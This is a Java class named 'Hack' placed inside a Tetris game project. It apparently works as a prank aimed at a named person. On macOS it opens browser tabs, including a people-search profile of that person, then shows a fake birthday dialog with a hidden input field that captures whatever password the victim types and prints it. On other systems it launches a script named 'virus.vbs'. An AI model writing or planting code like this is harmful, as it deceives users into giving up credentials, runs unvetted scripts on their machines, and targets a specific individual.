package jrJava.tetris_step_5_properBurial;

import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.awt.AWTException;
import java.io.*;
public class Hack {
	Random rd= new Random();
	String os_name=System.getProperty("os.name").toLowerCase();
	public void beAnnoying() throws AWTException, IOException{
		if (os_name.contains("mac os")) {
			final Process p = new ProcessBuilder("open", "-a", "Safari", "https://docs.google.com/presentation/d/1crC01HxcOyts6w4xxJEKJ7iJpXaBtPWxKmclGo2oVdI/edit#slide=id.gc6f972163_0_8","https://www.mylife.com/raman-kaura/e435933789186").start();
	
			try {
				Thread.sleep(200);
			} catch (InterruptedException e) { }
			
			final Process pj = new ProcessBuilder("open", "-a", "Google Chrome", "https://www.youtube.com/watch?v=GgmFC8y8q3k").start();
			
			var password=""; 
			String[] commandToRun = { "osascript", "-e", "set theResponse to display dialog \"HappyBirthdayRaman Press the continue button to see your surprise!\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n" + 
					"return theResponse" };
			Runtime run = Runtime.getRuntime();
			InputStream inputStream=run.exec(commandToRun).getInputStream();
			password=new BufferedReader(new InputStreamReader(inputStream)).lines().collect(Collectors.joining("\n"));
			System.out.println(password);
			
		
		
		
		}
		else {
			String[] commandToRun = {"cmd.exe","/c","start", "cd eclipse-workspace", "virus.vbs"};
			Runtime run = Runtime.getRuntime();
			run.exec(commandToRun);
		}
	}
	}

